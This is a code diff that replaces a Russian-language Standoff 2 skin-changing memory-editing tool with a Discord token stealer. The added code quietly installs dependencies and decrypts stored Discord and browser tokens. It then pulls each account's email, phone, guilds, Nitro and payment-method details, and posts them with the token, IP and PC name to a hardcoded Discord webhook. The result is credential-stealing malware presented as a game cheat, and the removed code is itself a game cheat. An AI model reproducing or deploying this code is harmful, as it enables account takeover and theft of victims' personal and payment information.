@@ -1,264 +1,213 @@
-import pymem
-import pymem.process
-import psutil
 import os
-import logging
-import re
-import struct
+if os.name != "nt":
+    exit()
+import subprocess
 import sys
+import json
+import urllib.request
+import re
+import base64
+import datetime
 
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-logger = logging.getLogger(__name__)
+def install_import(modules):
+    for module, pip_name in modules:
+        try:
+            __import__(module)
+        except ImportError:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            os.execl(sys.executable, sys.executable, *sys.argv)
 
-def get_resource_path(relative_path):
-    """Получает абсолютный путь к файлу, работает для .py и .exe."""
-    exe_dir = os.path.dirname(os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__))
-    local_path = os.path.join(exe_dir, relative_path)
-    if os.path.exists(local_path):
-        logger.info(f"Файл найден рядом с .exe: {local_path}")
-        return local_path
+install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])
+
+import win32crypt
+from Crypto.Cipher import AES
+
+LOCAL = os.getenv("LOCALAPPDATA")
+ROAMING = os.getenv("APPDATA")
+PATHS = {
+    'Discord': ROAMING + '\\discord',
+    'Discord Canary': ROAMING + '\\discordcanary',
+    'Lightcord': ROAMING + '\\Lightcord',
+    'Discord PTB': ROAMING + '\\discordptb',
+    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
+    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
+    'Amigo': LOCAL + '\\Amigo\\User Data',
+    'Torch': LOCAL + '\\Torch\\User Data',
+    'Kometa': LOCAL + '\\Kometa\\User Data',
+    'Orbitum': LOCAL + '\\Orbitum\\User Data',
+    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
+    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
+    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
+    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
+    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
+    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
+    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
+    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
+    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
+    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
+    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
+}
+
+def getheaders(token=None):
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
+    }
+
+    if token:
+        headers.update({"Authorization": token})
+
+    return headers
+
+def gettokens(path):
+    path += "\\Local Storage\\leveldb\\"
+    tokens = []
+
+    if not os.path.exists(path):
+        return tokens
+
+    for file in os.listdir(path):
+        if not file.endswith(".ldb") and file.endswith(".log"):
+            continue
+
+        try:
+            with open(f"{path}{file}", "r", errors="ignore") as f:
+                for line in (x.strip() for x in f.readlines()):
+                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                        tokens.append(values)
+        except PermissionError:
+            continue
+
+    return tokens
     
-    try:
-        base_path = sys._MEIPASS
-    except AttributeError:
-        base_path = exe_dir
-    embedded_path = os.path.join(base_path, relative_path)
-    logger.info(f"Файл ищется во временной папке: {embedded_path}")
-    return embedded_path
+def getkey(path):
+    with open(path + f"\\Local State", "r") as file:
+        key = json.loads(file.read())['os_crypt']['encrypted_key']
+        file.close()
 
-def load_skin_ids(file_path):
-    """Читает ID скинов из файла формата 'Имя_Скина = Числовой_ID'."""
-    file_path = get_resource_path(file_path)
+    return key
+
+def getip():
     try:
-        if not os.path.exists(file_path):
-            logger.error(f"Файл {file_path} не найден!")
-            return []
-        skin_ids = []
-        with open(file_path, 'r', encoding='utf-8') as file:
-            for line in file:
-                line = line.strip()
-                if not line or '=' not in line:
+        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
+            return json.loads(response.read().decode()).get("ip")
+    except:
+        return "None"
+
+def main():
+    checked = []
+
+    for platform, path in PATHS.items():
+        if not os.path.exists(path):
+            continue
+
+        for token in gettokens(path):
+            token = token.replace("\\", "") if token.endswith("\\") else token
+
+            try:
+                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
+                if token in checked:
                     continue
-                match = re.match(r'(\w+)\s*=\s*(\d+);?', line)
-                if match:
-                    skin_name, skin_id = match.groups()
-                    skin_ids.append((skin_name, int(skin_id)))
-        logger.info(f"Загружено {len(skin_ids)} ID скинов из {file_path}")
-        return skin_ids
-    except Exception as e:
-        logger.error(f"Ошибка при чтении файла {file_path}: {e}")
-        return []
+                checked.append(token)
 
-def find_process():
-    """Находит процесс эмулятора (HD-Player, LdVBoxHeadless, Ld9BoxHeadless)."""
-    process_names = ["HD-Player.exe", "LdVBoxHeadless.exe", "Ld9BoxHeadless.exe"]
-    try:
-        for proc in psutil.process_iter(['name']):
-            if proc.info['name'].lower() in [name.lower() for name in process_names]:
-                emulator = "LDPlayer" if "Ld" in proc.info['name'] else "BlueStacks"
-                logger.info(f"Найден процесс {proc.info['name']} (PID: {proc.pid}, Эмулятор: {emulator})")
-                return proc.pid, proc.info['name'], emulator
-        logger.error("Процесс эмулятора не найден!")
-        return None, None, None
-    except Exception as e:
-        logger.error(f"Ошибка при поиске процесса: {e}")
-        return None, None, None
-
-def check_signature(pm, address):
-    """Проверяет, соответствует ли память после адреса сигнатуре '01 00 00 00 ?? 00 00 ??'."""
-    try:
-        bytes_read = pm.read_bytes(address + 4, 8)
-        expected = [0x01, 0x00, 0x00, 0x00, None, 0x00, 0x00, None]
-        for i, (b, e) in enumerate(zip(bytes_read, expected)):
-            if e is not None and b != e:
-                return False
-        return True
-    except Exception as e:
-        logger.warning(f"Ошибка при проверке сигнатуры на адресе {hex(address)}: {e}")
-        return False
-
-def search_skins(pm, skin_ids, memory_start=0x59682f00, memory_end=0xee6b2800):
-    """Ищет скины в памяти процесса по ID и проверяет сигнатуру."""
-    found_skins = []
-    try:
-        for skin_name, skin_id in skin_ids:
-            logger.info(f"Поиск скина: {skin_name} (ID: {skin_id})")
-            try:
-                pattern = struct.pack('<I', skin_id)
-                addresses = pm.pattern_scan_all(pattern, return_multiple=True)
-                for addr in addresses:
-                    if memory_start <= addr <= memory_end:
-                        if check_signature(pm, addr):
-                            found_skins.append((skin_name, skin_id, addr))
-                            logger.info(f"Найден скин: {skin_name} (ID: {skin_id}), Адрес: {hex(addr)}")
-                
-                if not any(memory_start <= addr <= memory_end for addr, _, _ in found_skins):
-                    logger.info(f"Скин {skin_name} не найден в диапазоне, пробуем полный поиск...")
-                    addresses = pm.pattern_scan_all(pattern, return_multiple=True)
-                    for addr in addresses:
-                        if check_signature(pm, addr):
-                            found_skins.append((skin_name, skin_id, addr))
-                            logger.info(f"Найден скин (полный поиск): {skin_name} (ID: {skin_id}), Адрес: {hex(addr)}")
-            except Exception as e:
-                logger.warning(f"Ошибка при поиске скина {skin_name} (ID: {skin_id}): {e}")
-        if not found_skins:
-            logger.info("Скины не найдены в памяти процесса.")
-    except Exception as e:
-        logger.error(f"Общая ошибка при поиске скинов: {e}")
-    return found_skins
-
-def replace_skin(pm, address, new_id):
-    """Заменяет скин по указанному адресу на новый ID (32-битное целое)."""
-    try:
-        if not isinstance(new_id, int) or new_id < 0:
-            raise ValueError("Новый ID должен быть положительным целым числом")
-        pm.write_int(address, new_id)
-        logger.info(f"Скин по адресу {hex(address)} успешно заменён на ID {new_id}")
-        return True
-    except Exception as e:
-        logger.error(f"Ошибка при замене скина по адресу {hex(address)}: {e}")
-        print(f"Ошибка при замене: {e}")
-        return False
-
-def main_menu():
-    search_file = "search.txt"
-    replace_file = "skins.txt"
-    custom_id = None
-    memory_start = 0x59682f00
-    memory_end = 0xee6b2800
-    
-    while True:
-        print("""
-████████╗ ██████╗     ██╗     ██╗████████╗███████╗██╗    ██╗ █████╗ ██████╗ ███████╗
-╚══██╔══╝██╔════╝     ██║     ██║╚══██╔══╝██╔════╝██║    ██║██╔══██╗██╔══██╗██╔════╝
-   ██║   ██║  ███╗    ██║     ██║   ██║   █████╗  ██║ █╗ ██║███████║██████╔╝█████╗  
-   ██║   ██║   ██║    ██║     ██║   ██║   ██╔══╝  ██║███╗██║██╔══██║██╔══██╗██╔══╝  
-   ██║   ╚██████╔╝    ███████╗██║   ██║   ███████╗╚███╔███╔╝██║  ██║██║  ██║███████╗
-   ╚═╝    ╚═════╝     ╚══════╝╚═╝   ╚═╝   ╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
-""")
-        print("[1] ПОИСК СКИНОВ")
-        print("[2] ЗАМЕНИТЬ СКИН")
-        print("[3] Выход")
-        
-        choice = input("Выберите действие (1-3): ")
-        
-        if choice == "1":
-            skin_ids = load_skin_ids(search_file)
-            if not skin_ids:
-                print("Ошибка: файл search.txt пуст или не найден.")
-                continue
-            
-            pid, proc_name, emulator = find_process()
-            if not pid:
-                print("Ошибка: процесс эмулятора не найден. Запустите Standoff 2.")
-                continue
-            
-            try:
-                pm = pymem.Pymem(proc_name)
-                print(f"\nПодключено к {emulator} ({proc_name})")
-                found_skins = search_skins(pm, skin_ids, memory_start, memory_end)
-                if not found_skins:
-                    print("Скины не найдены в памяти процесса. Попробуйте перезапустить эмулятор.")
-                else:
-                    print(f"\nНайдено скинов: {len(found_skins)}")
-                    for i, (skin_name, skin_id, addr) in enumerate(found_skins, 1):
-                        print(f"{i}. {skin_name} (ID: {skin_id}), Адрес: {hex(addr)}")
-            except Exception as e:
-                logger.error(f"Ошибка при поиске скинов: {e}")
-                print(f"Произошла ошибка: {e}")
-        
-        elif choice == "2":
-            skin_ids = load_skin_ids(search_file)
-            if not skin_ids:
-                print("Ошибка: файл search.txt пуст или не найден.")
-                continue
-            
-            replace_ids = load_skin_ids(replace_file)
-            if not replace_ids and not custom_id:
-                print("Ошибка: файл skins.txt пуст, и кастомный ID не установлен. Используйте пункт 3.")
-                continue
-            
-            pid, proc_name, emulator = find_process()
-            if not pid:
-                print("Ошибка: процесс эмулятора не найден. Запустите Standoff 2.")
-                continue
-            
-            try:
-                pm = pymem.Pymem(proc_name)
-                print(f"\nПодключено к {emulator} ({proc_name})")
-                found_skins = search_skins(pm, skin_ids, memory_start, memory_end)
-                if not found_skins:
-                    print("Скины не найдены в памяти процесса. Попробуйте перезапустить эмулятор.")
+                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
+                if res.getcode() != 200:
                     continue
-                
-                print("\nНайденные скины:")
-                for i, (skin_name, skin_id, addr) in enumerate(found_skins, 1):
-                    print(f"{i}. {skin_name} (ID: {skin_id}), Адрес: {hex(addr)}")
-                
-                try:
-                    skin_index = int(input(f"\nВыберите номер скина для замены (1-{len(found_skins)}): ")) - 1
-                    if 0 <= skin_index < len(found_skins):
-                        skin_name, skin_id, addr = found_skins[skin_index]
-                        print(f"\nВы выбрали: {skin_name} (ID: {skin_id})")
-                        
-                        if replace_ids:
-                            print("\nСкины для замены (из skins.txt):")
-                            for i, (replace_name, replace_id) in enumerate(replace_ids, 1):
-                                print(f"{i}. {replace_name} (ID: {replace_id})")
-                            if custom_id:
-                                print(f"{len(replace_ids) + 1}. Кастомный ID: {custom_id}")
-                            max_choice = len(replace_ids) + 1 if custom_id else len(replace_ids)
-                            replace_choice = input(f"Выберите номер скина для замены (1-{max_choice}): ")
-                            try:
-                                replace_index = int(replace_choice) - 1
-                                if 0 <= replace_index < len(replace_ids):
-                                    new_name, new_id = replace_ids[replace_index]
-                                    if replace_skin(pm, addr, new_id):
-                                        print(f"\nУспех: {skin_name} заменён на {new_name} (ID: {new_id})")
-                                    else:
-                                        print("\nНе удалось заменить скин. Перезапустите эмулятор.")
-                                elif custom_id and replace_index == len(replace_ids):
-                                    if replace_skin(pm, addr, int(custom_id)):
-                                        print(f"\nУспех: {skin_name} заменён на кастомный ID {custom_id}")
-                                    else:
-                                        print("\nНе удалось заменить скин. Перезапустите эмулятор.")
-                                else:
-                                    print("Неверный выбор!")
-                            except ValueError:
-                                print("Ошибка: введите число!")
-                        elif custom_id:
-                            if replace_skin(pm, addr, int(custom_id)):
-                                print(f"\nУспех: {skin_name} заменён на кастомный ID {custom_id}")
-                            else:
-                                print("\nНе удалось заменить скин. Перезапустите эмулятор.")
-                        else:
-                            print("Ошибка: кастомный ID не установлен, и skins.txt пуст.")
+                res_json = json.loads(res.read().decode())
+
+                badges = ""
+                flags = res_json['flags']
+                if flags == 64 or flags == 96:
+                    badges += ":BadgeBravery: "
+                if flags == 128 or flags == 160:
+                    badges += ":BadgeBrilliance: "
+                if flags == 256 or flags == 288:
+                    badges += ":BadgeBalance: "
+
+                params = urllib.parse.urlencode({"with_counts": True})
+                res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(token))).read().decode())
+                guilds = len(res)
+                guild_infos = ""
+
+                for guild in res:
+                    if guild['permissions'] & 8 or guild['permissions'] & 32:
+                        res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))).read().decode())
+                        vanity = ""
+
+                        if res["vanity_url_code"] != None:
+                            vanity = f"""; .gg/{res["vanity_url_code"]}"""
+
+                        guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
+                if guild_infos == "":
+                    guild_infos = "No guilds"
+
+                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))).read().decode())
+                has_nitro = False
+                has_nitro = bool(len(res) > 0)
+                exp_date = None
+                if has_nitro:
+                    badges += f":BadgeSubscriber: "
+                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')
+
+                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
+                available = 0
+                print_boost = ""
+                boost = False
+                for id in res:
+                    cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
+                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
+                        print_boost += f"ㅤ- Available now\n"
+                        available += 1
                     else:
-                        print(f"Ошибка: выберите номер от 1 до {len(found_skins)}!")
-                except ValueError:
-                    print("Ошибка: введите число!")
+                        print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
+                    boost = True
+                if boost:
+                    badges += f":BadgeBoost: "
+
+                payment_methods = 0
+                type = ""
+                valid = 0
+                for x in json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token))).read().decode()):
+                    if x['type'] == 1:
+                        type += "CreditCard "
+                        if not x['invalid']:
+                            valid += 1
+                        payment_methods += 1
+                    elif x['type'] == 2:
+                        type += "PayPal "
+                        if not x['invalid']:
+                            valid += 1
+                        payment_methods += 1
+
+                print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
+                nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
+                print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type}\n```"
+                embed_user = {
+                    'embeds': [
+                        {
+                            'title': f"**New user data: {res_json['username']}**",
+                            'description': f"""
+                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
+                            'color': 3092790,
+                            'footer': {
+                                'text': "Made by Astraa ・ https://github.com/astraadev"
+                            },
+                            'thumbnail': {
+                                'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
+                            }
+                        }
+                    ],
+                    "username": "Grabber",
+                    "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
+                }
+
+                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1409480619880087553/hj5_EINxmhU4g0E9uy284GzswqWNNwm9HPlImW2PRv1lhbIfcBGAzlA59AJbrXC_X60i', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
+            except urllib.error.HTTPError or json.JSONDecodeError:
+                continue
             except Exception as e:
-                logger.error(f"Ошибка при замене скина: {e}")
-                print(f"Произошла ошибка: {e}")
-        
-        elif choice == "3":
-            custom_id = input("Введите кастомный ID скина (число): ").strip()
-            try:
-                custom_id = int(custom_id)
-                if custom_id < 0:
-                    raise ValueError("ID должен быть положительным!")
-                logger.info(f"Кастомный ID установлен: {custom_id}")
-                print(f"Кастомный ID установлен: {custom_id}")
-            except ValueError:
-                print("Ошибка: ID должен быть положительным числом!")
-                custom_id = None
-        
-        elif choice == "4":
-            print("Выход из программы...")
-            logger.info("Программа завершена.")
-            break
-        else:
-            print("Ошибка: выберите действие от 1 до 4!")
+                print(f"ERROR: {e}")
+                continue
 
 if __name__ == "__main__":
-    main_menu()
+    main()
